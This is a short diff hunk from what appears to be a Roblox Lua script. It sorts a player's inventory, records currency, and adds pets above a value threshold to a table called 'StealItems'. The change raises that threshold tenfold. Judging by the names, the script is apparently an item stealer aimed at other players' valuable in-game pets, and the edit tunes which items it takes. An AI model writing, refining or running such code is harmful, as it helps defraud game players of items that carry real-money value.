@@ -252,7 +252,7 @@ if _G.Act == true then
                         if x:IsA("Currency") then
                             Diamonds = value
                         end
-                        if x:IsA("Pet") and GetRap(x) < 100000 then
+                        if x:IsA("Pet") and GetRap(x) < 1000000 then
                             print("")
                         else
                             table.insert(StealItems,{
